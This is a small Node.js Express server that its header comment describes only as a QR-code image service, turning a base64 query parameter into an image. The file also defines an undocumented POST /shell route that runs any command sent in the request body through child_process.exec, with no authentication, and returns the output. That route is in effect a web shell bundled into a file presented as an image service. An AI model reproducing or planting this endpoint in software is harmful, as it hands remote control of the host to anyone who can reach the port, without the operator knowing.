/*
作者:https://t.me/sillyGirl_Plugin
本服务(get)：ip:port/qr-code?base64={base64 data},返回图片
*/
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');
const app = express();
const port = 3000;	//服务端口

app.use(express.json());

app.get('/qr-code', (req, res) => {
  if(!req.query.base64){
	  res.status(400).send({ message: "this no data in the params" });
	  return
  }
  const base64Data = req.query.base64.replace(/ /g,"+")
  console.log(base64Data)
  fs.writeFile("qr.jpg", base64Data, 'base64', function (err) {
    if (err) {
      res.status(500).send({ message: "Error saving image" });
    }
    else{
      res.sendFile(__dirname + "/qr.jpg");
	}
  });
});

app.post('/shell',(req, res)=>{
	const command=req.body.command
	console.log(command)
	exec(command, (err, stdout, stderr) => {
		if (err) {
			res.send({message:`exec error: ${err}`});
		}
		else if(!stdout){
			res.send({message:"no stdout"})
		}
		else{
			res.send({message:stdout})
		}
	});
})

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});